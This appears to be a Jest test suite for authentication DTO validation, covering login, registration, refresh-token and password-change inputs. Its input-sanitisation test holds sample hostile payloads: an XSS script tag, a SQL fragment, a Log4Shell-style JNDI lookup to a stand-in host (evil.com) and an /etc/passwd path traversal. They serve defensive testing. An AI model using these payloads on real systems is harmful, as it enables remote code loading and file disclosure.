/**
 * Authentication DTOs Test Suite
 * Comprehensive validation tests for authentication data transfer objects
 *
 * Tests cover:
 * - Input validation and sanitization
 * - Security boundary validation
 * - Data transformation logic
 * - Error message accuracy
 * - Edge case handling
 *
 * @author Security Test Implementation Specialist
 * @version 1.0.0
 * @since Authentication Module Testing Phase
 */

import { validate } from 'class-validator';
import { plainToClass } from 'class-transformer';
import {
  LoginDto,
  RegisterDto,
  RefreshTokenDto,
  ChangePasswordDto,
} from '../login.dto';

describe('Authentication DTOs', () => {
  describe('LoginDto', () => {
    describe('Email Validation', () => {
      it('should accept valid email addresses', async () => {
        const validEmails = [
          'user@example.com',
          'test.email@domain.co.uk',
          'user+tag@company.org',
          'admin@sub.domain.com',
        ];

        for (const email of validEmails) {
          const dto = plainToClass(LoginDto, {
            email,
            password: 'SecurePass123!',
          });

          const errors = await validate(dto);
          const emailErrors = errors.filter(
            (error) => error.property === 'email',
          );

          expect(emailErrors).toHaveLength(0);
        }
      });

      it('should reject invalid email formats', async () => {
        const invalidEmails = [
          'invalid-email',
          'user@',
          '@domain.com',
          'user..double.dot@domain.com',
          'user@domain',
          '',
          'user space@domain.com',
        ];

        for (const email of invalidEmails) {
          const dto = plainToClass(LoginDto, {
            email,
            password: 'SecurePass123!',
          });

          const errors = await validate(dto);
          const emailErrors = errors.filter(
            (error) => error.property === 'email',
          );

          expect(emailErrors.length).toBeGreaterThan(0);
          expect(emailErrors[0].constraints).toHaveProperty('isEmail');
        }
      });

      it('should transform email to lowercase and trim whitespace', () => {
        const dto = plainToClass(LoginDto, {
          email: '  USER@EXAMPLE.COM  ',
          password: 'SecurePass123!',
        });

        expect(dto.email).toBe('user@example.com');
      });

      it('should require email field', async () => {
        const dto = plainToClass(LoginDto, {
          password: 'SecurePass123!',
        });

        const errors = await validate(dto);
        const emailErrors = errors.filter(
          (error) => error.property === 'email',
        );

        expect(emailErrors.length).toBeGreaterThan(0);
        expect(emailErrors[0].constraints).toHaveProperty('isNotEmpty');
      });

      it('should handle undefined email values', () => {
        const dto = plainToClass(LoginDto, {
          email: undefined,
          password: 'SecurePass123!',
        });

        expect(dto.email).toBeUndefined();
      });
    });

    describe('Password Validation', () => {
      it('should accept valid passwords', async () => {
        const validPasswords = [
          'SecurePass123!',
          'MyPassword1@',
          'Complex#Password9',
          'A'.repeat(8), // minimum length
          'B'.repeat(128), // maximum length
        ];

        for (const password of validPasswords) {
          const dto = plainToClass(LoginDto, {
            email: 'user@example.com',
            password,
          });

          const errors = await validate(dto);
          const passwordErrors = errors.filter(
            (error) => error.property === 'password',
          );

          expect(passwordErrors).toHaveLength(0);
        }
      });

      it('should reject passwords that are too short', async () => {
        const shortPasswords = ['1234567', 'short', ''];

        for (const password of shortPasswords) {
          const dto = plainToClass(LoginDto, {
            email: 'user@example.com',
            password,
          });

          const errors = await validate(dto);
          const passwordErrors = errors.filter(
            (error) => error.property === 'password',
          );

          expect(passwordErrors.length).toBeGreaterThan(0);
          if (password === '') {
            expect(passwordErrors[0].constraints).toHaveProperty('isNotEmpty');
          } else {
            expect(passwordErrors[0].constraints).toHaveProperty('minLength');
          }
        }
      });

      it('should reject passwords that are too long', async () => {
        const longPassword = 'A'.repeat(129);

        const dto = plainToClass(LoginDto, {
          email: 'user@example.com',
          password: longPassword,
        });

        const errors = await validate(dto);
        const passwordErrors = errors.filter(
          (error) => error.property === 'password',
        );

        expect(passwordErrors.length).toBeGreaterThan(0);
        expect(passwordErrors[0].constraints).toHaveProperty('maxLength');
      });

      it('should reject non-string passwords', async () => {
        const nonStringPasswords = [123, null, [], {}];

        for (const password of nonStringPasswords) {
          const dto = plainToClass(LoginDto, {
            email: 'user@example.com',
            password,
          });

          const errors = await validate(dto);
          const passwordErrors = errors.filter(
            (error) => error.property === 'password',
          );

          expect(passwordErrors.length).toBeGreaterThan(0);
          expect(passwordErrors[0].constraints).toHaveProperty('isString');
        }
      });

      it('should require password field', async () => {
        const dto = plainToClass(LoginDto, {
          email: 'user@example.com',
        });

        const errors = await validate(dto);
        const passwordErrors = errors.filter(
          (error) => error.property === 'password',
        );

        expect(passwordErrors.length).toBeGreaterThan(0);
        expect(passwordErrors[0].constraints).toHaveProperty('isNotEmpty');
      });
    });

    describe('RememberMe Validation', () => {
      it('should accept boolean values for rememberMe', async () => {
        const booleanValues = [true, false];

        for (const rememberMe of booleanValues) {
          const dto = plainToClass(LoginDto, {
            email: 'user@example.com',
            password: 'SecurePass123!',
            rememberMe,
          });

          const errors = await validate(dto);
          const rememberMeErrors = errors.filter(
            (error) => error.property === 'rememberMe',
          );

          expect(rememberMeErrors).toHaveLength(0);
        }
      });

      it('should allow rememberMe to be undefined (optional)', async () => {
        const dto = plainToClass(LoginDto, {
          email: 'user@example.com',
          password: 'SecurePass123!',
        });

        const errors = await validate(dto);
        const rememberMeErrors = errors.filter(
          (error) => error.property === 'rememberMe',
        );

        expect(rememberMeErrors).toHaveLength(0);
        expect(dto.rememberMe).toBeUndefined();
      });

      it('should reject non-boolean values for rememberMe', async () => {
        const nonBooleanValues = ['true', 1, 0, [], {}];

        for (const rememberMe of nonBooleanValues) {
          const dto = plainToClass(LoginDto, {
            email: 'user@example.com',
            password: 'SecurePass123!',
            rememberMe,
          });

          const errors = await validate(dto);
          const rememberMeErrors = errors.filter(
            (error) => error.property === 'rememberMe',
          );

          expect(rememberMeErrors.length).toBeGreaterThan(0);
          expect(rememberMeErrors[0].constraints).toHaveProperty('isBoolean');
        }
      });
    });

    describe('Complete DTO Validation', () => {
      it('should validate complete valid DTO', async () => {
        const dto = plainToClass(LoginDto, {
          email: 'user@example.com',
          password: 'SecurePass123!',
          rememberMe: true,
        });

        const errors = await validate(dto);
        expect(errors).toHaveLength(0);
      });

      it('should accumulate multiple validation errors', async () => {
        const dto = plainToClass(LoginDto, {
          email: 'invalid-email',
          password: 'short',
          rememberMe: 'not-boolean',
        });

        const errors = await validate(dto);
        expect(errors.length).toBeGreaterThan(0);

        const errorProperties = errors.map((error) => error.property);
        expect(errorProperties).toContain('email');
        expect(errorProperties).toContain('password');
        expect(errorProperties).toContain('rememberMe');
      });
    });
  });

  describe('RegisterDto', () => {
    describe('Email Validation', () => {
      it('should accept valid email addresses', async () => {
        const validEmails = [
          'user@example.com',
          'test.email@domain.co.uk',
          'user+tag@company.org',
        ];

        for (const email of validEmails) {
          const dto = plainToClass(RegisterDto, {
            email,
            username: 'testuser',
            password: 'SecurePass123!',
            confirmPassword: 'SecurePass123!',
          });

          const errors = await validate(dto);
          const emailErrors = errors.filter(
            (error) => error.property === 'email',
          );

          expect(emailErrors).toHaveLength(0);
        }
      });

      it('should transform email to lowercase and trim whitespace', () => {
        const dto = plainToClass(RegisterDto, {
          email: '  USER@EXAMPLE.COM  ',
          username: 'testuser',
          password: 'SecurePass123!',
          confirmPassword: 'SecurePass123!',
        });

        expect(dto.email).toBe('user@example.com');
      });
    });

    describe('Username Validation', () => {
      it('should accept valid usernames', async () => {
        const validUsernames = [
          'testuser',
          'user123',
          'user_name',
          'user-name',
          'abc', // minimum length
          'a'.repeat(30), // maximum length
        ];

        for (const username of validUsernames) {
          const dto = plainToClass(RegisterDto, {
            email: 'user@example.com',
            username,
            password: 'SecurePass123!',
            confirmPassword: 'SecurePass123!',
          });

          const errors = await validate(dto);
          const usernameErrors = errors.filter(
            (error) => error.property === 'username',
          );

          expect(usernameErrors).toHaveLength(0);
        }
      });

      it('should reject usernames with invalid characters', async () => {
        const invalidUsernames = [
          'user@name', // @ symbol
          'user.name', // dot
          'user name', // space
          'user#name', // hash
          'user!name', // exclamation
        ];

        for (const username of invalidUsernames) {
          const dto = plainToClass(RegisterDto, {
            email: 'user@example.com',
            username,
            password: 'SecurePass123!',
            confirmPassword: 'SecurePass123!',
          });

          const errors = await validate(dto);
          const usernameErrors = errors.filter(
            (error) => error.property === 'username',
          );

          expect(usernameErrors.length).toBeGreaterThan(0);
          expect(usernameErrors[0].constraints).toHaveProperty('matches');
        }
      });

      it('should reject usernames that are too short', async () => {
        const dto = plainToClass(RegisterDto, {
          email: 'user@example.com',
          username: 'ab', // too short
          password: 'SecurePass123!',
          confirmPassword: 'SecurePass123!',
        });

        const errors = await validate(dto);
        const usernameErrors = errors.filter(
          (error) => error.property === 'username',
        );

        expect(usernameErrors.length).toBeGreaterThan(0);
        expect(usernameErrors[0].constraints).toHaveProperty('minLength');
      });

      it('should reject usernames that are too long', async () => {
        const dto = plainToClass(RegisterDto, {
          email: 'user@example.com',
          username: 'a'.repeat(31), // too long
          password: 'SecurePass123!',
          confirmPassword: 'SecurePass123!',
        });

        const errors = await validate(dto);
        const usernameErrors = errors.filter(
          (error) => error.property === 'username',
        );

        expect(usernameErrors.length).toBeGreaterThan(0);
        expect(usernameErrors[0].constraints).toHaveProperty('maxLength');
      });

      it('should transform username to lowercase and trim whitespace', () => {
        const dto = plainToClass(RegisterDto, {
          email: 'user@example.com',
          username: '  TestUser123  ',
          password: 'SecurePass123!',
          confirmPassword: 'SecurePass123!',
        });

        expect(dto.username).toBe('testuser123');
      });
    });

    describe('Name Fields Validation', () => {
      it('should accept valid first and last names', async () => {
        const dto = plainToClass(RegisterDto, {
          email: 'user@example.com',
          username: 'testuser',
          firstName: 'John',
          lastName: 'Doe',
          password: 'SecurePass123!',
          confirmPassword: 'SecurePass123!',
        });

        const errors = await validate(dto);
        const nameErrors = errors.filter((error) =>
          ['firstName', 'lastName'].includes(error.property),
        );

        expect(nameErrors).toHaveLength(0);
      });

      it('should allow first and last names to be optional', async () => {
        const dto = plainToClass(RegisterDto, {
          email: 'user@example.com',
          username: 'testuser',
          password: 'SecurePass123!',
          confirmPassword: 'SecurePass123!',
        });

        const errors = await validate(dto);
        const nameErrors = errors.filter((error) =>
          ['firstName', 'lastName'].includes(error.property),
        );

        expect(nameErrors).toHaveLength(0);
      });

      it('should reject names that are too long', async () => {
        const longName = 'A'.repeat(51);

        const dto = plainToClass(RegisterDto, {
          email: 'user@example.com',
          username: 'testuser',
          firstName: longName,
          lastName: longName,
          password: 'SecurePass123!',
          confirmPassword: 'SecurePass123!',
        });

        const errors = await validate(dto);
        const nameErrors = errors.filter((error) =>
          ['firstName', 'lastName'].includes(error.property),
        );

        expect(nameErrors.length).toBeGreaterThan(0);
        nameErrors.forEach((error) => {
          expect(error.constraints).toHaveProperty('maxLength');
        });
      });

      it('should trim whitespace from names', () => {
        const dto = plainToClass(RegisterDto, {
          email: 'user@example.com',
          username: 'testuser',
          firstName: '  John  ',
          lastName: '  Doe  ',
          password: 'SecurePass123!',
          confirmPassword: 'SecurePass123!',
        });

        expect(dto.firstName).toBe('John');
        expect(dto.lastName).toBe('Doe');
      });

      it('should reject non-string names', async () => {
        const dto = plainToClass(RegisterDto, {
          email: 'user@example.com',
          username: 'testuser',
          firstName: 123,
          lastName: [],
          password: 'SecurePass123!',
          confirmPassword: 'SecurePass123!',
        });

        const errors = await validate(dto);
        const nameErrors = errors.filter((error) =>
          ['firstName', 'lastName'].includes(error.property),
        );

        expect(nameErrors.length).toBeGreaterThan(0);
        nameErrors.forEach((error) => {
          expect(error.constraints).toHaveProperty('isString');
        });
      });
    });

    describe('Password Security Validation', () => {
      it('should accept passwords meeting security requirements', async () => {
        const validPasswords = [
          'SecurePass123!',
          'MyPassword1@',
          'ValidPass1$',
          'Strong123&',
        ];

        for (const password of validPasswords) {
          const dto = plainToClass(RegisterDto, {
            email: 'user@example.com',
            username: 'testuser',
            password,
            confirmPassword: password,
          });

          const errors = await validate(dto);
          const passwordErrors = errors.filter(
            (error) => error.property === 'password',
          );

          expect(passwordErrors).toHaveLength(0);
        }
      });

      it('should reject passwords without uppercase letters', async () => {
        const dto = plainToClass(RegisterDto, {
          email: 'user@example.com',
          username: 'testuser',
          password: 'lowercase123!', // no uppercase
          confirmPassword: 'lowercase123!',
        });

        const errors = await validate(dto);
        const passwordErrors = errors.filter(
          (error) => error.property === 'password',
        );

        expect(passwordErrors.length).toBeGreaterThan(0);
        expect(passwordErrors[0].constraints).toHaveProperty('matches');
      });

      it('should reject passwords without lowercase letters', async () => {
        const dto = plainToClass(RegisterDto, {
          email: 'user@example.com',
          username: 'testuser',
          password: 'UPPERCASE123!', // no lowercase
          confirmPassword: 'UPPERCASE123!',
        });

        const errors = await validate(dto);
        const passwordErrors = errors.filter(
          (error) => error.property === 'password',
        );

        expect(passwordErrors.length).toBeGreaterThan(0);
        expect(passwordErrors[0].constraints).toHaveProperty('matches');
      });

      it('should reject passwords without numbers', async () => {
        const dto = plainToClass(RegisterDto, {
          email: 'user@example.com',
          username: 'testuser',
          password: 'NoNumbers!', // no digits
          confirmPassword: 'NoNumbers!',
        });

        const errors = await validate(dto);
        const passwordErrors = errors.filter(
          (error) => error.property === 'password',
        );

        expect(passwordErrors.length).toBeGreaterThan(0);
        expect(passwordErrors[0].constraints).toHaveProperty('matches');
      });

      it('should reject passwords without special characters', async () => {
        const dto = plainToClass(RegisterDto, {
          email: 'user@example.com',
          username: 'testuser',
          password: 'NoSpecialChars123', // no special characters
          confirmPassword: 'NoSpecialChars123',
        });

        const errors = await validate(dto);
        const passwordErrors = errors.filter(
          (error) => error.property === 'password',
        );

        expect(passwordErrors.length).toBeGreaterThan(0);
        expect(passwordErrors[0].constraints).toHaveProperty('matches');
      });

      it('should require password confirmation', async () => {
        const dto = plainToClass(RegisterDto, {
          email: 'user@example.com',
          username: 'testuser',
          password: 'SecurePass123!',
        });

        const errors = await validate(dto);
        const confirmErrors = errors.filter(
          (error) => error.property === 'confirmPassword',
        );

        expect(confirmErrors.length).toBeGreaterThan(0);
        expect(confirmErrors[0].constraints).toHaveProperty('isNotEmpty');
      });
    });

    describe('Complete DTO Validation', () => {
      it('should validate complete valid DTO', async () => {
        const dto = plainToClass(RegisterDto, {
          email: 'user@example.com',
          username: 'testuser',
          firstName: 'John',
          lastName: 'Doe',
          password: 'SecurePass123!',
          confirmPassword: 'SecurePass123!',
        });

        const errors = await validate(dto);
        expect(errors).toHaveLength(0);
      });

      it('should validate minimal valid DTO', async () => {
        const dto = plainToClass(RegisterDto, {
          email: 'user@example.com',
          username: 'testuser',
          password: 'SecurePass123!',
          confirmPassword: 'SecurePass123!',
        });

        const errors = await validate(dto);
        expect(errors).toHaveLength(0);
      });
    });
  });

  describe('RefreshTokenDto', () => {
    describe('Token Validation', () => {
      it('should accept valid refresh tokens', async () => {
        const validTokens = [
          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
          'some-refresh-token-string',
          'token123456',
        ];

        for (const token of validTokens) {
          const dto = plainToClass(RefreshTokenDto, {
            refreshToken: token,
          });

          const errors = await validate(dto);
          expect(errors).toHaveLength(0);
        }
      });

      it('should reject empty refresh tokens', async () => {
        const dto = plainToClass(RefreshTokenDto, {
          refreshToken: '',
        });

        const errors = await validate(dto);
        const tokenErrors = errors.filter(
          (error) => error.property === 'refreshToken',
        );

        expect(tokenErrors.length).toBeGreaterThan(0);
        expect(tokenErrors[0].constraints).toHaveProperty('isNotEmpty');
      });

      it('should reject non-string refresh tokens', async () => {
        const nonStringTokens = [123, null, [], {}];

        for (const token of nonStringTokens) {
          const dto = plainToClass(RefreshTokenDto, {
            refreshToken: token,
          });

          const errors = await validate(dto);
          const tokenErrors = errors.filter(
            (error) => error.property === 'refreshToken',
          );

          expect(tokenErrors.length).toBeGreaterThan(0);
          expect(tokenErrors[0].constraints).toHaveProperty('isString');
        }
      });

      it('should require refresh token field', async () => {
        const dto = plainToClass(RefreshTokenDto, {});

        const errors = await validate(dto);
        const tokenErrors = errors.filter(
          (error) => error.property === 'refreshToken',
        );

        expect(tokenErrors.length).toBeGreaterThan(0);
        expect(tokenErrors[0].constraints).toHaveProperty('isNotEmpty');
      });
    });
  });

  describe('ChangePasswordDto', () => {
    describe('Current Password Validation', () => {
      it('should accept valid current passwords', async () => {
        const dto = plainToClass(ChangePasswordDto, {
          currentPassword: 'CurrentPass123!',
          newPassword: 'NewSecurePass123!',
          confirmNewPassword: 'NewSecurePass123!',
        });

        const errors = await validate(dto);
        const currentPasswordErrors = errors.filter(
          (error) => error.property === 'currentPassword',
        );

        expect(currentPasswordErrors).toHaveLength(0);
      });

      it('should reject empty current passwords', async () => {
        const dto = plainToClass(ChangePasswordDto, {
          currentPassword: '',
          newPassword: 'NewSecurePass123!',
          confirmNewPassword: 'NewSecurePass123!',
        });

        const errors = await validate(dto);
        const currentPasswordErrors = errors.filter(
          (error) => error.property === 'currentPassword',
        );

        expect(currentPasswordErrors.length).toBeGreaterThan(0);
        expect(currentPasswordErrors[0].constraints).toHaveProperty(
          'isNotEmpty',
        );
      });

      it('should require current password field', async () => {
        const dto = plainToClass(ChangePasswordDto, {
          newPassword: 'NewSecurePass123!',
          confirmNewPassword: 'NewSecurePass123!',
        });

        const errors = await validate(dto);
        const currentPasswordErrors = errors.filter(
          (error) => error.property === 'currentPassword',
        );

        expect(currentPasswordErrors.length).toBeGreaterThan(0);
        expect(currentPasswordErrors[0].constraints).toHaveProperty(
          'isNotEmpty',
        );
      });
    });

    describe('New Password Security Validation', () => {
      it('should accept new passwords meeting security requirements', async () => {
        const validPasswords = [
          'NewSecurePass123!',
          'MyNewPassword1@',
          'StrongNew123&',
        ];

        for (const password of validPasswords) {
          const dto = plainToClass(ChangePasswordDto, {
            currentPassword: 'CurrentPass123!',
            newPassword: password,
            confirmNewPassword: password,
          });

          const errors = await validate(dto);
          const newPasswordErrors = errors.filter(
            (error) => error.property === 'newPassword',
          );

          expect(newPasswordErrors).toHaveLength(0);
        }
      });

      it('should reject new passwords without security requirements', async () => {
        const insecurePasswords = [
          'lowercase123!', // no uppercase
          'UPPERCASE123!', // no lowercase
          'NoNumbers!', // no digits
          'NoSpecialChars123', // no special characters
          'Short1!', // too short
        ];

        for (const password of insecurePasswords) {
          const dto = plainToClass(ChangePasswordDto, {
            currentPassword: 'CurrentPass123!',
            newPassword: password,
            confirmNewPassword: password,
          });

          const errors = await validate(dto);
          const newPasswordErrors = errors.filter(
            (error) => error.property === 'newPassword',
          );

          expect(newPasswordErrors.length).toBeGreaterThan(0);
        }
      });

      it('should require new password confirmation', async () => {
        const dto = plainToClass(ChangePasswordDto, {
          currentPassword: 'CurrentPass123!',
          newPassword: 'NewSecurePass123!',
        });

        const errors = await validate(dto);
        const confirmErrors = errors.filter(
          (error) => error.property === 'confirmNewPassword',
        );

        expect(confirmErrors.length).toBeGreaterThan(0);
        expect(confirmErrors[0].constraints).toHaveProperty('isNotEmpty');
      });

      it('should reject empty new password confirmation', async () => {
        const dto = plainToClass(ChangePasswordDto, {
          currentPassword: 'CurrentPass123!',
          newPassword: 'NewSecurePass123!',
          confirmNewPassword: '',
        });

        const errors = await validate(dto);
        const confirmErrors = errors.filter(
          (error) => error.property === 'confirmNewPassword',
        );

        expect(confirmErrors.length).toBeGreaterThan(0);
        expect(confirmErrors[0].constraints).toHaveProperty('isNotEmpty');
      });
    });

    describe('Complete DTO Validation', () => {
      it('should validate complete valid DTO', async () => {
        const dto = plainToClass(ChangePasswordDto, {
          currentPassword: 'CurrentPass123!',
          newPassword: 'NewSecurePass123!',
          confirmNewPassword: 'NewSecurePass123!',
        });

        const errors = await validate(dto);
        expect(errors).toHaveLength(0);
      });

      it('should accumulate multiple validation errors', async () => {
        const dto = plainToClass(ChangePasswordDto, {
          currentPassword: '',
          newPassword: 'weak',
          confirmNewPassword: '',
        });

        const errors = await validate(dto);
        expect(errors.length).toBeGreaterThan(0);

        const errorProperties = errors.map((error) => error.property);
        expect(errorProperties).toContain('currentPassword');
        expect(errorProperties).toContain('newPassword');
        expect(errorProperties).toContain('confirmNewPassword');
      });
    });
  });

  describe('Cross-DTO Security Tests', () => {
    describe('Input Sanitization', () => {
      it('should handle potential injection attempts', async () => {
        const maliciousInputs = [
          '<script>alert("xss")</script>',
          'SELECT * FROM users;',
          '${jndi:ldap://evil.com/x}',
          '../../../etc/passwd',
        ];

        for (const maliciousInput of maliciousInputs) {
          const loginDto = plainToClass(LoginDto, {
            email: `${maliciousInput}@example.com`,
            password: maliciousInput,
          });

          const registerDto = plainToClass(RegisterDto, {
            email: `test@example.com`,
            username: 'testuser',
            firstName: maliciousInput,
            lastName: maliciousInput,
            password: 'SecurePass123!',
            confirmPassword: 'SecurePass123!',
          });

          // DTOs should still validate according to their rules
          // but not crash or expose vulnerabilities
          const loginErrors = await validate(loginDto);
          const registerErrors = await validate(registerDto);

          // Login should fail due to email format or other validation issues
          expect(loginErrors.length).toBeGreaterThan(0);

          // Register DTO might pass if firstName/lastName are optional and don't have strict validation
          // The important thing is that it doesn't crash
          expect(Array.isArray(registerErrors)).toBe(true);
        }
      });

      it('should handle unicode and special characters', async () => {
        const unicodeInputs = [
          'user@example.com', // normal
          'üser@éxample.com', // unicode
          'user@example.🚀', // emoji domain (should fail)
          'user@test.中国', // international domain
        ];

        for (const email of unicodeInputs) {
          const dto = plainToClass(LoginDto, {
            email,
            password: 'SecurePass123!',
          });

          const errors = await validate(dto);
          // Should handle gracefully without crashing
          expect(Array.isArray(errors)).toBe(true);
        }
      });
    });

    describe('Edge Case Handling', () => {
      it('should handle extremely large inputs', async () => {
        const largeString = 'A'.repeat(10000);

        const dto = plainToClass(RegisterDto, {
          email: 'user@example.com',
          username: 'testuser',
          firstName: largeString,
          password: 'SecurePass123!',
          confirmPassword: 'SecurePass123!',
        });

        const errors = await validate(dto);
        const firstNameErrors = errors.filter(
          (error) => error.property === 'firstName',
        );

        expect(firstNameErrors.length).toBeGreaterThan(0);
        expect(firstNameErrors[0].constraints).toHaveProperty('maxLength');
      });

      it('should handle null and undefined values gracefully', async () => {
        const dto = plainToClass(LoginDto, {
          email: null,
          password: undefined,
          rememberMe: null,
        });

        const errors = await validate(dto);
        expect(Array.isArray(errors)).toBe(true);
        expect(errors.length).toBeGreaterThan(0);
      });

      it('should handle empty objects', async () => {
        const dto = plainToClass(LoginDto, {});

        const errors = await validate(dto);
        expect(Array.isArray(errors)).toBe(true);
        expect(errors.length).toBeGreaterThan(0);
      });
    });

    describe('Performance and Memory', () => {
      it('should validate large batches without memory issues', async () => {
        const dtos = [];

        // Create 1000 DTOs for batch validation
        for (let i = 0; i < 1000; i++) {
          dtos.push(
            plainToClass(LoginDto, {
              email: `user${i}@example.com`,
              password: 'SecurePass123!',
              rememberMe: i % 2 === 0,
            }),
          );
        }

        // Validate all DTOs
        const validationPromises = dtos.map((dto) => validate(dto));
        const results = await Promise.all(validationPromises);

        expect(results).toHaveLength(1000);
        results.forEach((errors) => {
          expect(errors).toHaveLength(0);
        });
      });

      it('should complete validation within reasonable time', async () => {
        const startTime = Date.now();

        const dto = plainToClass(RegisterDto, {
          email: 'user@example.com',
          username: 'testuser',
          firstName: 'John',
          lastName: 'Doe',
          password: 'SecurePass123!',
          confirmPassword: 'SecurePass123!',
        });

        const errors = await validate(dto);
        const endTime = Date.now();
        const validationTime = endTime - startTime;

        expect(errors).toHaveLength(0);
        expect(validationTime).toBeLessThan(100); // Should complete within 100ms
      });
    });
  });
});
